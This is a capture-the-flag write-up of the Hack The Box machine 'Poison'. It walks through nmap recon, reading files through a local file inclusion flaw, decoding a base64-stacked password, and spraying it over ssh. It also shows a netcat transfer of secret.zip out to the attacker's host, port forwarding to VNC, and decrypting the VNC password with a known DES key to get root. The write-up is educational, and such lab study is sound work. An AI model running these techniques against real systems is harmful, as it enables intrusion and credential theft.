---
title: "Poison"
date: 2024-09-16T20:59:17-05:00
draft: false
tags:
- HTB
- FreeBSD
- Unix
- LFI
- Port Forwarding
- VNC
---

![Poison](/img/poison/poison.png#center)

## Description
Poison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.

## Recon
We start by running a Nmap scan against the target.
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -A 10.10.10.84 -T5   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 01:19 GMT
Warning: 10.10.10.84 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.84
Host is up (0.041s latency).
Not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.2-RELEASE - 11.3 RELEASE or 11.2-STABLE (96%), FreeBSD 11.3-RELEASE (96%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.1-RELEASE or 11.2-STABLE (95%), FreeBSD 11.1-RELEASE (95%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 12.0-RELEASE - 13.0-CURRENT (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   40.51 ms 10.10.14.1
2   40.65 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.47 seconds
```
The scan shows that TCP ports 22 and 80 are open. Visiting the webpage on port 80, we can see a website with the title "Temporary website to test local .php scripts".

![website](/img/poison/website.png)

There is a list of files that we can test. I tried listfiles.php. The output was messy, so I used view source to get a cleaner view.

![listfiles.php result](/img/poison/listfiles.png)

We get a directory listing. It appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can't get a shell through RFI :\(. We could also try other attack vectors like log poisoning (which does give you shell as ```www-data```), but there is an interesting file "pwdbackup.txt" that we can check out first.

![pwdbackup text](/img/poison/encodedpass.png)

Success! Now all we need to do is decode the password. We will need to do this 13 times, as implied by the note from out unsuspecting target. This can be done by passing the password to ```base64 -d``` manually, but it's far simpler to use a script. I've provided one below:

```shell
#!/bin/bash

encoded_pass="Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo="

for i in {1..13}
do
        encoded_pass=$(echo -n "$encoded_pass" | base64 -d)
done

echo -n "$encoded_pass"
```

After running the script, we get our password ```Charix!2#4%6&8(0```.

## Foothold
We have a password, but we don't know any users we could potentially authenticate as. Recall that the webpage can read files. Since we know that the target machine is likely FreeBSD, a Unix-like OS, we can try to read the ```/etc/passwd``` to find users.

![/etc/passwd file](/img/poison/traversal_passwd.png)

Notice there are three users: ```root```, ```toor```, and ```charix``` that seem interesting. We can spray our password against these accounts via ssh. It is true that ```Charix!2#4%6&8(0``` is likely the password for ```charix```, it's still worth checking the other accounts for password reuse.

![Password spray](/img/poison/pass_spray.png)

And now we can authenticate as ```charix``` to the server.

## Privilege Escalation
Now that we have a shell, we can move onto privilege escalation. Feel free to grab the user flag, but there is also a ```secret.zip``` file that might be interesting. It's password protected though, and I find files easier to investigate when they are on my local machine. So I transferred the zip file to Kali.

On Kali:
```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 8000 > secret.zip            
listening on [any] 8000 ...
```

On Poison:
```
charix@Poison:~ % nc -nv 10.10.14.33 8000 < secret.zip
Connection to 10.10.14.33 8000 port [tcp/*] succeeded!
```

Before trying to crack the password, we can test for password reuse by supplying the password we got for ```charix``` . It succeeds and we get a ```secret``` file that appears to be random binary data. I couldn't figure out its purpose at this point, so I decided to enumerate further. I noticed three TCP ports only accessible from localhost on Poison: 25, 5801, and 5901.

```
charix@Poison:~ % sockstat -4
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      728   4  tcp4   *:80                  *:*
charix   sshd       719   3  tcp4   10.10.10.84:22        10.10.14.33:57270
root     sshd       716   3  tcp4   10.10.10.84:22        10.10.14.33:57270
www      httpd      704   4  tcp4   *:80                  *:*
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
www      httpd      641   4  tcp4   *:80                  *:*
www      httpd      640   4  tcp4   *:80                  *:*
www      httpd      639   4  tcp4   *:80                  *:*
www      httpd      638   4  tcp4   *:80                  *:*
www      httpd      637   4  tcp4   *:80                  *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
```

I had already checked for any mail-related privesc vectors at this point, so I was more interested in ports 5801 and 5901. However, since they were only accessible by localhost on Poison, I had to forward them to my attacker machine.

```
# Forward Port 5801
ssh -N -L 5801:127.0.0.1:5801 charix@10.10.10.84

# Forward Port 5901
ssh -N -L 5901:127.0.0.1:5901 charix@10.10.10.84
```

Now we can do some more enumeration.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p5801,5901 127.0.0.1 -sV --script=default
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 19:27 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000097s latency).

PORT     STATE SERVICE VERSION
5801/tcp open  http    Bacula http config
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.83 seconds
```

VNC is running on port 5901. VNC is a system designed to share screens. This means that a user using VNC can interact with... The VNC password file is usually stored in ```~/.vnc/passwd```. This path does not exist for ```charix``` though, but there was a ```passwd``` file that we extracted from ```secret.zip```. We can check if it it indeed a VNC password file by attempting to extract a VNC password:

```
┌──(kali㉿kali)-[/tmp]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
VNCP@$$!
```

Success! Now that we are certain we have a VNC password file, we can use it to connect to Poison.

```
┌──(kali㉿kali)-[/tmp]
└─$ vncviewer -passwd secret 127.0.0.1::5901
```

![vnc successful connect](/img/poison/vnc_pwn.png)

And with that, we have root on the machine.

